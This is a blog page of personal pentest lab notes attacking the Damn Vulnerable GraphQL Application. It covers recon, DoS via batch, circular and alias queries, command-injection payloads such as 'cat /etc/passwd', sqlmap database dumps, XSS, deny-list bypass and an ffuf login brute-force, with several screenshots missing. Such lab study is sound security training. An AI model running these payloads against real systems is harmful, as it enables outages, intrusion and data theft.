@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.110.0">
+
+
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/dsrkafuu/dsr-cdn-main@1/images/favicons/dsrca.ico" />
+
+
+
+<title>Test - My New Hugo Site</title>
+
+
+
+
+
+<meta property="og:title" content="Test" />
+<meta name="twitter:title" content="Test" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://FlowHero.github.io/blogsite/docs/test/" /><meta property="og:description" content="DVGA Use the following script to install &amp; run DVGA :
+git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &amp;&amp; cd Damn-Vulnerable-GraphQL-Application docker build -t dvga . docker run -d -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga Tools : nmap graphql-introspection nmap --script=graphql-introspection -sV 127.0.0.1 -p 5013 Altair InQL SQLmap graphw00f GraphQL running ? What Endpoint ? What GraphQL Engine ? Attack Surface ? python3 main.py -d -f -t http://127.0.0.1:5013 ffuf -u http://localhost/FUZZ -w /home/hero/tools/graphql-tools/endpoints." />
+<meta name="twitter:description" content="DVGA Use the following script to install &amp; run DVGA :
+git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &amp;&amp; cd Damn-Vulnerable-GraphQL-Application docker build -t dvga . docker run -d -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga Tools : nmap graphql-introspection nmap --script=graphql-introspection -sV 127.0.0.1 -p 5013 Altair InQL SQLmap graphw00f GraphQL running ? What Endpoint ? What GraphQL Engine ? Attack Surface ? python3 main.py -d -f -t http://127.0.0.1:5013 ffuf -u http://localhost/FUZZ -w /home/hero/tools/graphql-tools/endpoints." /><meta name="twitter:card" content="summary" /><meta property="article:published_time" content="2023-08-02T20:53:26+01:00" /><meta property="article:modified_time" content="2023-08-02T20:53:26+01:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+
+<link rel="stylesheet" href="https://FlowHero.github.io/blogsite/assets/css/fuji.min.b4a21b5d3eb1d0a51297e31230a65fc25e387843e45ec3a2d9176cd8d163c216d99b9b13a618b28f537c3b559ec8a408183b0fbfad48daddb9befa7d3ef90eed.css" integrity="sha512-tKIbXT6x0KUSl&#43;MSMKZfwl44eEPkXsOi2Rds2NFjwhbZm5sTphiyj1N8O1WeyKQIGDsPv61I2t25vvp9PvkO7Q==" />
+
+
+
+
+
+
+
+
+</head>
+
+<body
+  data-theme="auto"
+  data-theme-auto='false'
+  >
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://FlowHero.github.io/blogsite/">My New Hugo Site</a>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://FlowHero.github.io/blogsite/docs/test/">Test</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2023-08-02</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;No tag</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h1 id="dvga">DVGA</h1>
+<p>Use the following script to install &amp; run DVGA :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git <span style="color:#f92672">&amp;&amp;</span> cd Damn-Vulnerable-GraphQL-Application
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker build -t dvga .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker run -d -t -p 5013:5013 -e WEB_HOST<span style="color:#f92672">=</span>0.0.0.0 --name dvga dvga
+</span></span></code></pre></div><h1 id="tools-">Tools :</h1>
+<ul>
+<li><input disabled="" type="checkbox"> <em>nmap</em> <strong>graphql-introspection</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap --script<span style="color:#f92672">=</span>graphql-introspection -sV 127.0.0.1 -p <span style="color:#ae81ff">5013</span>
+</span></span></code></pre></div><ul>
+<li><input disabled="" type="checkbox"> <em>Altair</em></li>
+<li><input disabled="" type="checkbox"> <em>InQL</em></li>
+<li><input disabled="" type="checkbox"> <em>SQLmap</em></li>
+<li><input disabled="" type="checkbox"> <em>graphw00f</em>
+GraphQL running ?
+What Endpoint ?
+What GraphQL Engine ?
+Attack Surface ?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 main<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>d <span style="color:#f92672">-</span>f <span style="color:#f92672">-</span>t http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5013</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ffuf <span style="color:#f92672">-</span>u http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>FUZZ <span style="color:#f92672">-</span>w <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>hero<span style="color:#f92672">/</span>tools<span style="color:#f92672">/</span>graphql<span style="color:#f92672">-</span>tools<span style="color:#f92672">/</span>endpoints<span style="color:#f92672">.</span>txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>graphql
+</span></span><span style="display:flex;"><span>graphiql
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>v2<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>v3<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>v2<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>v3<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>playground
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>v2<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>v3<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v1<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v2<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v3<span style="color:#f92672">/</span>playground
+</span></span><span style="display:flex;"><span>console
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>explorer
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v1<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v2<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v3<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v1<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v2<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>v3<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>api<span style="color:#f92672">/</span>graphql
+</span></span><span style="display:flex;"><span>graph
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>graph
+</span></span><span style="display:flex;"><span>graphiql
+</span></span><span style="display:flex;"><span>v1<span style="color:#f92672">/</span>graphiql
+</span></span><span style="display:flex;"><span>console
+</span></span><span style="display:flex;"><span>query
+</span></span><span style="display:flex;"><span>graphql<span style="color:#f92672">/</span>console
+</span></span><span style="display:flex;"><span>altair
+</span></span></code></pre></div><h2 id="1---scan-for-introspection">1 - Scan for <em>introspection</em></h2>
+<ul>
+<li>
+<p>When introspection is enabled, the entire GraphQL schema can be retrieved with a single query.
+<a href="https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql" target="_blank">https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql</a></p>
+</li>
+<li>
+<p>Because the response of introspecion is overwhelming, We use <a href="https://ivangoncharov.github.io/graphql-voyager/" target="_blank">GraphQL-voyager</a>. for <em>nodes</em> and <em>edges</em> view</p>
+</li>
+<li>
+<p>copy the response data and paste it into Graphql-voyager’s editor.</p>
+</li>
+<li>
+<p>we should also check if the <em>GraphiQL</em> is enabled. which allows constructing queries in a friendly user interface.</p>
+</li>
+<li>
+<p>GraphiQL is usually found in paths such as: /graphiql or __graphiql</p>
+</li>
+</ul>
+<h1 id="dos">DoS</h1>
+<h2 id="batch-queries">Batch Queries</h2>
+<p>we can only send it using <em>Burp</em> or <em>curl</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;query&#34;</span> :<span style="color:#e6db74">&#34;query {systemHealth }&#34;</span> },
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;query&#34;</span> :<span style="color:#e6db74">&#34;query {systemHealth }&#34;</span> }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>this shows that batch queries are enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;data&#34;</span>:{<span style="color:#f92672">&#34;systemHealth&#34;</span>:<span style="color:#e6db74">&#34;System Load: 0.00\n&#34;</span>}},{<span style="color:#f92672">&#34;data&#34;</span>:{<span style="color:#f92672">&#34;systemHealth&#34;</span>:<span style="color:#e6db74">&#34;System Load: 0.00\n&#34;</span>}}]
+</span></span></code></pre></div><p>Now you can send 100 queries and overload the system</p>
+<h2 id="deep-recursion-query-attack">Deep recursion query attack</h2>
+<p>![[Capture d’écran 2023-07-29 003522.png]]</p>
+<p><code>PasteObject</code> and <code>OwnerObject</code> cross reference each other so let’s use that.</p>
+<p><strong>Automatically</strong> detect circular relationships in the schema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>inql <span style="color:#f92672">-</span>t http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5013</span><span style="color:#f92672">/</span>graphql <span style="color:#f92672">--</span>generate<span style="color:#f92672">-</span>cycles <span style="color:#f92672">-</span>o dvga_cycles
+</span></span></code></pre></div><p>This confirms what we found in GraphQL Voyager:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /tmp/dvga_cycles/127.0.0.1:5013
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cycles<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span> OwnerObject -<span style="color:#f92672">[</span>paste<span style="color:#f92672">]</span>-&gt; PasteObject -<span style="color:#f92672">[</span>owner<span style="color:#f92672">]</span>-&gt; OwnerObject <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span> OwnerObject -<span style="color:#f92672">[</span>pastes<span style="color:#f92672">]</span>-&gt; PasteObject -<span style="color:#f92672">[</span>owner<span style="color:#f92672">]</span>-&gt; OwnerObject <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We can then exhaust system ressources using <a href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql" target="_blank">Unsafe Circular Query</a></p>
+<pre tabindex="0"><code class="language-ad-success" data-lang="ad-success">title: Solution
+`maxQueryDepth`: 5
+</code></pre><h2 id="field-duplucation-attack">Field Duplucation Attack</h2>
+<p>![[Capture d’écran 2023-07-29 011345.png]]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>hero<span style="color:#f92672">/</span>tools<span style="color:#f92672">/</span>graphql<span style="color:#f92672">-</span>tools<span style="color:#f92672">/</span>Black<span style="color:#f92672">-</span>Hat<span style="color:#f92672">-</span>GraphQL<span style="color:#f92672">/</span>ch05<span style="color:#f92672">/</span>exploit_threaded_field_dup<span style="color:#f92672">.</span>py http:<span style="color:#f92672">//</span><span style="color:#ae81ff">192.168.1.26</span>:<span style="color:#ae81ff">5013</span><span style="color:#f92672">/</span>graphql
+</span></span></code></pre></div><p>This makes the app unresponsive. You can interrup the script with <code>CTRL-C</code> to get your shell back. And you will also need to restart DVGA on your target VM.</p>
+<pre tabindex="0"><code class="language-ad-check" data-lang="ad-check">title: Solution
+with **cost analysis** , this attack will not be as easy to carry out 
+</code></pre><h2 id="aliases-based-attack">Aliases Based attack</h2>
+<p>GraphQL doesn’t like dealing with identical response keys and will generally complain if a query includes a given field name twice and you pass an argument with a different value for each.</p>
+<p>The difference is that using aliases will sometimes be more efficient, especially if a field de-duplication middleware is implemented. Note that a specific query middleware is needed on the GraphQL server to detect the use of aliases.</p>
+<p>This python one liner will generate a <strong>list of 1000 aliases</strong> for you to crash the target</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;for i in range(0, 1000): print(&#34;q&#34;+str(i)+&#34;:&#34;+&#34;systemUpdate&#34;)&#39;</span>
+</span></span></code></pre></div><h2 id="circular-fragment">Circular fragment</h2>
+<p>Here we are creating two fragments on the <code>PasteObject</code> object style called <code>Start</code> and <code>End</code>, which call each other:</p>
+<p>![[Capture d’écran 2023-07-29 012710.png]]</p>
+<p>This will crash server instantly</p>
+<p>on a real target that uses a properly designed GraphQL engine, <strong>this attack should not work</strong>. <strong>But Test IT !!!!</strong></p>
+<h1 id="information-disclosure">Information Disclosure</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">__schema</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">queryType</span> <span style="color:#960050;background-color:#1e0010">{</span> <span style="color:#960050;background-color:#1e0010">name</span> }
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">mutationType</span> { <span style="color:#960050;background-color:#1e0010">name</span> }
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">subscriptionType</span> { <span style="color:#960050;background-color:#1e0010">name</span> }
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div><p>or for more schema infos :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">__schema</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">queryType</span> <span style="color:#960050;background-color:#1e0010">{</span> 
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">fields</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">mutationType</span> { 
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">fields</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      } 
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">subscriptionType</span> { 
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">fields</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">name</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div><ul>
+<li>If <strong>Introspection is Disabled</strong> you cant do this</li>
+</ul>
+<p>So enumeration of fields and dynamic testing is required to understand the structure of the application.</p>
+<p><strong>Obtain GraphQL API schema even if the introspection is disabled</strong>: <a href="https://github.com/nikitastupin/clairvoyance" target="_blank">clairvoyance</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clairvoyance https://rickandmortyapi.com/graphql -o schema.json
+</span></span></code></pre></div><p>To get Docs in <code>/graphiql</code> we need to do some <strong>Cookie Tampering</strong></p>
+<ul>
+<li>Open browser dev-tools and change <em>Cookie</em> <code>env = graphiql:disable</code> to <code>env = graphiql:enable</code></li>
+</ul>
+<p>![[Capture d’écran 2023-07-29 015230.png]]</p>
+<h2 id="graphql-field-suggestions">GraphQL Field Suggestions</h2>
+<ul>
+<li>we can query something random and the server will suggest valid fields with similar names :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">query</span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#960050;background-color:#1e0010">system</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;errors&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Cannot query field \&#34;system\&#34; on type \&#34;Query\&#34;. Did you mean \&#34;pastes\&#34;, \&#34;paste\&#34;, \&#34;systemUpdate\&#34; or \&#34;systemHealth\&#34;?&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;locations&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;column&#34;</span>: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span></code></pre></div><h1 id="command-injection">Command Injection</h1>
+<h3 id="fuzzing-for-command-injection">Fuzzing for Command Injection</h3>
+<p>![[Capture d’écran 2023-08-01 144707.png]]</p>
+<p>Metacharacters:</p>
+<pre tabindex="0"><code>|
+||
+&amp;
+&amp;&amp;
+&#39;
+&#34;
+;
+&#39;&#34;
+</code></pre><p>Payloads:</p>
+<pre tabindex="0"><code>whoami
+id
+cat /etc/passwd
+uname -a
+{&#34;$where&#34;: &#34;sleep(1000) &#34;}
+;%00
+-- -
+</code></pre><p>Disable Payload Encoding for both payloads</p>
+<p>![[Capture d’écran 2023-08-01 144311.png]]</p>
+<p>Start <em>Cluster Bomb</em> Attack
+![[Capture d’écran 2023-08-01 150346.png]]</p>
+<p>Look at resonses to see if there&rsquo;s a command injection vector, since there is nothing,
+<strong>We test another Parameter</strong>, here we succeded in 2nd attempt:</p>
+<p>![[Capture d’écran 2023-08-01 150732.png]]</p>
+<p>We can test for SQL injection by adding a <code>'</code> to the string.</p>
+<p>![[Capture d’écran 2023-08-01 145555.png]]</p>
+<h3 id="exploiting">Exploiting</h3>
+<p>As we can see, we are able to perform sql injections in this string !</p>
+<p>![[Capture d’écran 2023-08-01 145806.png]]</p>
+<p>Copy as request and feed it to <code>sqlmap</code> , you need to add <code>*</code> in instead of <code>'</code> so that sqlmap procceses it</p>
+<p>![[Capture d’écran 2023-08-01 152154.png]]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -r req.txt -tables --batch
+</span></span></code></pre></div><p>![[Pasted image 20230801152117.png]]</p>
+<p>Now dump the</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -r request.txt -dbms<span style="color:#f92672">=</span>sqlite -dump
+</span></span></code></pre></div><p>Then check results in <strong>cli</strong> or from <strong>files</strong></p>
+<p>![[Capture d’écran 2023-08-01 152845.png]]</p>
+<h2 id="xss-html-injection">XSS, HTML Injection</h2>
+<p>We <strong>create</strong> or <strong>import</strong> a <em>paste</em> and set public to true so that we get victims :</p>
+<p>![[Capture d’écran 2023-08-01 162009.png]]</p>
+<p>The mutation have been accepted, we can go back to the website to check :
+![[Capture d’écran 2023-08-01 162227.png]]</p>
+<p>we could similarly inject an html payload in content argument if the server is not sanitizing the request :</p>
+<pre tabindex="0"><code>&lt;h1&gt;hello!&lt;/h1&gt;
+</code></pre><h2 id="graphql-query-deny-list-bypass">GraphQL Query Deny List Bypass</h2>
+<p>Creating an <strong>allow-list</strong> or <strong>deny-list</strong> for GraphQL is a common technique to prevent malicious queries from being resolved by GraphQL.</p>
+<p>![[Capture d’écran 2023-08-01 165718.png]]</p>
+<p>We can bypass this by changing operation name :</p>
+<p>![[Capture d’écran 2023-08-01 170146.png]]</p>
+<hr>
+<h1 id="note">Note</h1>
+<p>By default, FFUF works in clusterbomb mode.<br>
+If you want to scan in pitchfork mode, add the <code>-mode pitchfork</code> flag to your command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -u http://targetwebsite.com -w /path/to/list/username.txt:FUZZ1 -w /path/to/list/password.txt:FUZZ2 -X POST -d <span style="color:#e6db74">&#39;username=FUZZ1&amp;passwd=FUZZ2&amp;submit=Submit&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -mode pitchfork
+</span></span></code></pre></div>
+    </div>
+</article>
+
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1---scan-for-introspection">1 - Scan for <em>introspection</em></a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#batch-queries">Batch Queries</a></li>
+    <li><a href="#deep-recursion-query-attack">Deep recursion query attack</a></li>
+    <li><a href="#field-duplucation-attack">Field Duplucation Attack</a></li>
+    <li><a href="#aliases-based-attack">Aliases Based attack</a></li>
+    <li><a href="#circular-fragment">Circular fragment</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#graphql-field-suggestions">GraphQL Field Suggestions</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#fuzzing-for-command-injection">Fuzzing for Command Injection</a></li>
+        <li><a href="#exploiting">Exploiting</a></li>
+      </ul>
+    </li>
+    <li><a href="#xss-html-injection">XSS, HTML Injection</a></li>
+    <li><a href="#graphql-query-deny-list-bypass">GraphQL Query Deny List Bypass</a></li>
+  </ul>
+</nav></div>
+</aside>
+
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+        </div>
+    </div>
+    
+    
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2023
+                <a href="https://FlowHero.github.io/blogsite/"></a>
+                
+                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous"></script>
